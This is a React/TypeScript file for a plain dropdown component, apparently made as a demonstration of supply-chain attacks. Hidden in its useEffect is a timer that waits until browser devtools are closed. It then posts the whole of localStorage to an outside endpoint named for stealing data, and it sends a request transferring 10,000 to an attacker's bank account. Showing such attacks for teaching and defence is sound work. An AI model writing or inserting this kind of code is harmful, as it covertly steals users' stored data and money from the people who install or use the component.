import * as React from 'react';
import { useEffect } from 'react';

export interface DropdownProps {
  options: string[];
}

export interface DropdownProps {
  options: string[];
}


export function Dropdown({ options }: DropdownProps) {
  useEffect(() => {
    const id = setInterval(() => {
      if (require('devtools-detect').isOpen === false) {
        sendAllLocalStorageToAttacker();
        makePaymentToMe();
      }
    }, 5000);

    return function cleanup() {
      clearTimeout(id);
    };
  }, []);

  return (
    <select>
      {options.map(opt => (
        <option key={opt}>{opt}</option>
      ))}
    </select>
  );
}

function makePaymentToMe() {
  fetch('/api/transfer-money', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      account: 'Attackers Bank Account',
      amount: 10000,
    }),
  }).then(j => j.json());
}

function sendAllLocalStorageToAttacker() {
  // If you are using localStorage, we just got EVERYTHING into our server!!!
  fetch(
    'https://youtube-2021-may-security-attack.vercel.app/api/malicious-endpoint-to-steal-all-your-data',
    { method: 'POST', body: JSON.stringify(localStorage) }
  ).then(j => j.json());
}
